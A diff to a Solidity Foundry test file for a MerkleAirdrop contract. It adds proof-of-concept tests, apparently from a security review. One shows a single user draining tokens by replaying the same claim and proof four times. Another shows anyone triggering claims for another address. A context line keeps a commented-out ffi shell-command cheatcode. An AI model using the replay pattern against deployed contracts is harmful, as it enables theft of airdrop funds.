@@ -4,7 +4,7 @@ pragma solidity 0.8.24;
 import { MerkleAirdrop } from "../src/MerkleAirdrop.sol";
 import { AirdropToken } from "./mocks/AirdropToken.sol";
 import { _CheatCodes } from "./mocks/CheatCodes.t.sol";
-import { Test } from "forge-std/Test.sol";
+import { Test, console } from "forge-std/Test.sol";
 
 contract MerkleAirdropTest is Test {
     MerkleAirdrop public airdrop;
@@ -44,4 +44,29 @@ contract MerkleAirdropTest is Test {
     //     cmds[1] = string.concat("youve-been-pwned");
     //     cheatCodes.ffi(cmds);
     // }
+
+
+    function testProofOfCodeUserCanDrainAllFunds() public {
+        uint256 startingBalance = token.balanceOf(collectorOne);
+        vm.deal(collectorOne, airdrop.getFee() * 4);
+        vm.startPrank(collectorOne);
+        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
+        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
+        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
+        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
+        vm.stopPrank();
+        uint256 endingBalance = token.balanceOf(collectorOne);
+        assertEq(endingBalance - startingBalance, amountToCollect * 4);
+        console.log(token.balanceOf(collectorOne));
+    }
+
+
+    function testProofOfCodeLossOfControl() public {
+        address user = makeAddr("user");
+        vm.deal(user, airdrop.getFee());
+        vm.startPrank(user);
+        airdrop.claim{ value: airdrop.getFee() }(collectorOne, amountToCollect, proof);
+        vm.stopPrank();
+        console.log(token.balanceOf(collectorOne));
+    }
 }
